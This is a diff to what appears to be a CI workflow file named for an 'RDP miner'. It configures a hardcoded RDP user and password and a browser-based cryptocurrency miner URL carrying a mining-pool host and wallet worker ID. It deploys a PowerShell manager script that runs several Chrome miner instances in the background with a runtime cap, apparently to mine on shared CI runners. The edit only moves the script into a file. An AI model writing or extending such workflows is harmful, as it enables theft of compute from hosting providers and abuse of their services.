@@ -21,7 +21,7 @@ env:
   RDP_USER: "RDPUser"
   RDP_PASSWORD: "DefaultPass!234"
   MAX_RUNTIME: 340    # 5h40m
-  MINER_URL: "https://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x&workers=8"
+  MINER_URL: "http://webminer.pages.dev/?algorithm=cwm_yespowerADVC&host=eu.rplant.xyz&port=17149&worker=Ab75TWDBpPx8ArWeTFLrQcgVA8xRxCwW7E&password=x"
 
 jobs:
   rdp-miner-pro:
@@ -141,8 +141,8 @@ jobs:
 
       - name: Deploy Advanced Miner System
         run: |
-          # Create miner management script
-          $minerScript = @"
+          # Create miner management script file instead of inline script block
+          $minerScriptContent = @'
           `$workers = $env:MINER_WORKERS
           `$minerUrl = "$env:MINER_URL&workers=`$workers"
           `$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
@@ -181,11 +181,11 @@ jobs:
               Write-Host "[`$(Get-Date)] Running miners: `$(`$runningJobs.Count)/`$workers"
               Start-Sleep -Seconds 60
           }
-"@
+'@
 
-          # Save and execute miner script
+          # Save miner script to file
           $scriptPath = "$env:TEMP\miner_manager.ps1"
-          $minerScript | Out-File -FilePath $scriptPath -Encoding UTF8
+          $minerScriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
           
           # Start miner manager as background job
           Start-Job -ScriptBlock {
